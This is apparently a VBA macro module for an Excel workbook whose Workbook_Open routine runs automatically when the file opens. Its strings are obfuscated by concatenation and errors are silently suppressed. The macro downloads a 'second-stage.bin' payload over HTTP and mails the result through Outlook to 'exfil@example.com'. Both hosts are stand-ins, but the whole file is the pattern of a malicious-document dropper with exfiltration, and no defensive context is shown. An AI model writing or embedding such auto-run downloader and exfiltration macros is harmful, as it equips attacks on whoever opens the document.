Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim http As Object, url As String
    Dim olApp As Object, olMail As Object
    On Error Resume Next
    url = "http:/" & "/127" & ".0.0" & ".1:9090/s" & "econd-st" & "age.bin"
    Set http = CreateObject("MSXML2.XM" & "LHTTP")
    http.Open "GET", url, False
    http.Send
    Set olApp = CreateObject("Outlook." & "Appl" & "icatio" & "n")
    Set olMail = olApp.CreateItem(0)
    olMail.To = "exfil@example.com"
    olMail.Subject = "logs"
    olMail.Body = http.Status
    olMail.Send
End Sub
